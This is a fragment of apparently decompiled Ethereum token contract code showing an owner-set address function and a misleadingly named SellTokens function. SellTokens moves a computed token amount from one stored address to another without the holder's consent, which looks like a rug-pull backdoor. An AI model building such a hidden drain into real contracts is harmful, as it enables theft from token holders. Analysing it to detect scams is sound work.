...
function SenderLP(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor12
    stor10 = arg1
...
function SellTokens(uint256 arg1) payable {
    ...
    if arg1 / 100 and stor9 > -1 / arg1 / 100:
        revert with 'NH{q', 17
    if balanceOf[stor10] < arg1 / 100 * stor9:
        revert with 'NH{q', 17
    balanceOf[stor10] += -1 * arg1 / 100 * stor9
    if arg1 / 100 and stor9 > -1 / arg1 / 100:
        revert with 'NH{q', 17
    if balanceOf[stor11] > (-1 * arg1 / 100 * stor9) - 1:
        revert with 'NH{q', 17
    balanceOf[stor11] += arg1 / 100 * stor9
    emit Transfer(arg1, stor10, stor11);
}
